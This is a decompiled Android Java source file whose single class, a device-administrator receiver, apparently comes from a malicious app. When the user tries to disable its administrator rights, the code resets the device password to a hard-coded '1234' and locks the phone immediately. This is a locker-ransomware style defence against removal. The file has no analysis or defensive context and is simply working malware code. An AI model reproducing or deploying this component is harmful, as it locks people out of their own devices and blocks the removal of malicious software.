/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  android.app.admin.DeviceAdminReceiver
 *  android.app.admin.DevicePolicyManager
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  java.lang.CharSequence
 *  java.lang.Class
 *  java.lang.Object
 *  java.lang.String
 */
package sigma.male;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

public class DeviceAdminComponent
extends DeviceAdminReceiver {
    private static final String OUR_SECURE_ADMIN_PASSWORD = "1234";

    public CharSequence onDisableRequested(Context context, Intent intent) {
        ComponentName componentName = new ComponentName(context, DeviceAdminComponent.class);
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager)context.getSystemService("device_policy");
        if (devicePolicyManager.isAdminActive(componentName)) {
            devicePolicyManager.setPasswordQuality(componentName, 131072);
        }
        devicePolicyManager.resetPassword(OUR_SECURE_ADMIN_PASSWORD, 1);
        devicePolicyManager.lockNow();
        return super.onDisableRequested(context, intent);
    }
}

